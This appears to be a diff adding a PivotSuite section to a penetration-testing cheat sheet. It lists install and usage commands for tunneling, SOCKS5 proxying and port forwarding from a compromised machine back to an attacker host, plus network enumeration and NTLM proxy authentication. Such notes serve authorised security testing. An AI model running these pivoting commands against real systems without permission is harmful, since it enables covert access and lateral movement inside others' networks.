@@ -245,3 +245,25 @@ FTP Bounce
 Idle Scan
 
 
+
+
+PivotSuite
+	https://github.com/RedTeamOperations/PivotSuite
+	pip install PivotSuite
+python pivotsuite.py [options] SERVER-IP SERVER-PORT
+	Forward TCP TUNNELING:
+python pivotsuite.py -S -F --server-option SP --server-ip 111.11.1.11 --server-port 4321
+	--Dynamic Port Forwarding (Socks5 Proxy Server) On Compromised machine
+python pivotsuite.py -S -F --server-option PF --network-protocol T/U --remote-ip 111.11.1.111 --remote-port 4321  --server-ip `curl icanhazip.com` --server-port 4321
+	Single Port Forwarding (TCP/UDP Relay) On Compromised machine
+	Reverse TCP Tunneling
+python pivotsute.py -S -W
+	-run as server on attacker host
+python pivotsuite.py -C -O SP --server-ip 111.11.1.111 --server-port 4321
+	--Dynamic Port Forwarding (Socks5 Proxy Server)
+python pivotsuite.py -C -O PF  -L/-R(local or remote port forwarding) -P T/U(TCP/UDP)  --local-ip `curl icanhazip.com` --local-port 4321 --remote-ip <IP> --remote-port 80 --server-ip 111.11.1.111 --server-port 4321
+	--Local/Remote Port Forwarding
+python pivotsuite.py -C -O NE --server-ip 111.11.1.111 --server-port 4321
+	--automated network enumeration of compromised host
+python pivotsuite.py -C -O SP --ntlm-proxy-ip <IP> --ntlm-proxy-port <PORT> --username UnamE --password PworD --server-ip 111.11.1.111 --server-port 4321
+	Proxy Authentication (NTLM) required for reverse connection
